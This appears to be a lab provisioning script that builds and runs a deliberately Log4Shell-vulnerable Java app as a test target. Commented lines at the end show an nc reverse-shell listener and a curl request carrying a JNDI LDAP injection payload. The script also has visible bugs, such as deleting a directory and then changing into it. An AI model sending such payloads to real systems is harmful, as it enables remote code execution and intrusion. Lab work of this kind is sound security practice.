#!/bin/bash

LOGFILE=/tmp/${var.tag}.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
    pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
    log "Waiting for apt to be available..."
    sleep 10
done

screen -S vuln_log4j_app_target -X quit
screen -wipe
truncate -s 0 /tmp/vuln_og4j_app_target.log
log "checking for git..."
while ! command -v git; do
    log "git not found - waiting"
    sleep 10
done
log "git: $(which git)"

# check for unzip
log "checking for unzip..."
if ! command -v unzip; then
    log "unzip not found - installing"
    apt-get update && apt-get install -y unzip
fi

rm -rf /vuln-log4j-app
cd /vuln-log4j-app

# install java 8u131
if [ ! -f /usr/java/jdk1.8.0_131/ ]; then
    wget -c --header "Cookie: oraclelicense=accept-securebackup-cookie" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz
    mkdir -p /usr/java
    sudo tar -xvzf jdk-8u131-linux-x64.tar.gz -C /usr/java
fi

# update java path
export JAVA_HOME=/usr/java/jdk1.8.0_131/
sudo update-alternatives --install /usr/bin/java java ${JAVA_HOME%*/}/bin/java 20000
sudo update-alternatives --install /usr/bin/javac javac ${JAVA_HOME%*/}/bin/javac 20000

java -version >> $LOGFILE 2>&1

# download gradle 7.3.1
if [ ! -f /opt/gradle/gradle-7.3.1 ]; then
    wget https://services.gradle.org/distributions/gradle-7.3.1-bin.zip
    mkdir /opt/gradle
    unzip -d /opt/gradle gradle-7.3.1-bin.zip
fi

# update gradle path
export PATH=$PATH:/opt/gradle/gradle-7.3.1/bin
gradle --version >> $LOGFILE 2>&1

# clone the log4shell vulnerable app
git clone https://github.com/christophetd/log4shell-vulnerable-app
cd log4shell-vulnerable-app
gradle bootJar --no-daemon

# copy java jar
cp build/libs/*.jar /vuln-log4j-app/spring-boot-application.jar

# # python requirements
# python3 -m pip install -r requirements.txt

# # python ldap server (note webserver hard coded to 8001)
# openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Example Inc./OU=IT Department/CN=example.com"
# python3 ldap.py 8000 &

# # python web server
# python3 web.py 8001 &

# java log4j vulnerable app (default is 8080)
screen -d -L -Logfile /tmp/vuln_log4j_app_target.log -S vuln_log4j_app_target -m java -jar /vuln-log4j-app/spring-boot-application.jar
screen -S vuln_log4j_app_target -X colon "logfile flush 0^M"
log 'waiting 30 minutes...';
sleep 1795
screen -S vuln_log4j_app_target -X quit
screen -wipe
log "done"

# # shell catcher (this is hard coded in Exploit.java class)
# nc -nlv 4444

# # create the remote shell
# curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:8000/cn=bob,ou=people,dc=example,dc=org}'

